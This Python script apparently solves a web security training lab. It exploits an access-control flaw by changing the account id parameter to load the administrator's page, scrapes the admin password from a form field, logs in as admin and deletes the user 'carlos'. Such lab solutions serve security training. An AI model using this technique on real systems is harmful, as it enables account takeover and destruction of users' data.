import sys
import requests
from bs4 import BeautifulSoup

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def init_soup(response_text):
    return BeautifulSoup(response_text, "html.parser")

def login(url, username, password):

    print()
    print(f"[*] Sending request as POST {url}/login with username: {username}, pass: {password}")
    print()

    data = {
         "username": username,
         "password": password,
    }

    s = requests.Session()

    print("[+] Sending GET request to /login to get the csrf token")
    response = s.get(url=url + "/login")
    soup = init_soup(response.text)
    csrf_token = soup.find("input")["value"]
    print(f"CSRF TOKEN: {csrf_token}")

    data["csrf"] = csrf_token

    response = s.post(url=url + "/login",data=data)

    return s

def logout(url, session):

    session.get(url + "/logout")
    return session.delete(url) 

def delete_carlos_user(url):

    s = login(url, "wiener", "peter")

    response = s.get(url + f"/my-account?id=administrator")
    soup = init_soup(response.text)

    print("Finding administrator password")
    admin_password = soup.find("input", {"type" : "password"})["value"].strip()
    print(f"Administrator password: {admin_password}")

    s = logout(url, s)

    print("Logging as administrator")
    s = login(url, "administrator", admin_password)

    print(f"Sending GET to {url}/admin/delete?username=carlos")

    data = {
        "username": "carlos"
    }

    response = s.get(url + "/admin/delete", params=data)

    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        delete_carlos_user(url)
        verify_if_lab_solved(url)
